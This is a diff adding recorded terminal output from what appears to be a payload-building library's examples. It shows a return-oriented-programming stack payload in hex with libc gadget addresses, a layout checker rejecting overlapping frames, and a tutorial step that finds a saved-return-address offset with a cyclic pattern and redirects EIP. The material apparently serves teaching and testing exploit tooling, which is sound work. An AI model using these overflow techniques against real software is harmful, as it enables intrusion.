@@ -1,0 +1,52 @@
+$ python3 before.py
+before payload: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141e5a3beba1f7f0000bd45d7ba1f7f0000d69cbeba1f7f00009022c1ba1f7f0000
+
+$ python3 after.py
+after  payload: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141e5a3beba1f7f0000bd45d7ba1f7f0000d69cbeba1f7f00009022c1ba1f7f0000
+
+$ python3 check.py
+byte-for-byte equal: 168 bytes across 1 buffer
+
+$ python3 refusal.py
+== pre-leak: every gadget cell reports itself waiting ==
+  stack.frames.rip (stack+0x88 w8) awaits libc_base
+  stack.frames.rdi (stack+0x90 w8) awaits libc_base
+  stack.frames.rip2 (stack+0x98 w8) awaits libc_base
+  stack.frames.rip3 (stack+0xa0 w8) awaits libc_base
+after bind: 0 fixups left
+stack.frames.rip (frames[+0x0]) @ stack+0x88
+cell: libc_base + 0x2a3e5 width=8 deliver=NORMAL
+bound: libc_base = 0x7f1fbabc0000 (source: puts(got.puts) leak)
+== THE REFUSAL: rev B shrank the buf; the offset didn't move ==
+refused:
+  final emit refused: check errors:
+  check: 4 errors, 0 warnings, 0 pending
+  ERROR CHK-001 [stack.frames, stack.revb_frames]: placement extents overlap without a declared alias  hint: declare intent: region.at(..., over=(other,), why=...)
+  ERROR CHK-008 [stack.frames.rdi, stack.revb_frames.rip2]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+  ERROR CHK-008 [stack.frames.rip, stack.revb_frames.rdi]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+  ERROR CHK-008 [stack.frames.rip2, stack.revb_frames.rip3]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+two beliefs about where saved-RIP lives cannot coexist past the gate
+
+$ python3 ex01_find_your_offset.py
+step 1: overflow buffer and saved words with a self-locating pad, then run it
+region frame (base=frame_base, fill=0x00)
+  +0x0000 w4 61616161  [frame.raw+0x0]
+  * +0x0004..+0x0044: 17 cyclic pad words  [frame.raw+*]
+  +0x0048 w4 73616161  [frame.raw+0x48]
+crash! segfault at eip=0x61616173
+
+step 2: ask the pad which offset those 4 bytes came from
+cycle_find(0x61616173) -> offset 72 (0x48) = the return-address slot
+
+step 3: rebuild with the ret we want (0x80491e2) at offset 0x48
+region frame (base=frame_base, fill=0x00)
+  +0x0000 w4 61616161  [frame.raw+0x0]
+  * +0x0004..+0x0040: 16 cyclic pad words  [frame.raw+*]
+  +0x0044 w4 72616161  [frame.raw+0x44]
+  +0x0048 w4 e2910408  [frame.raw+0x48]
+the next run lands at eip=0x080491e2
+
+same aim, by name
+region frame (base=frame_base, fill=0x61)
+  +0x0048 w4 e2910408  [frame.pops.ret]
+check out example 2 to start building real payloads
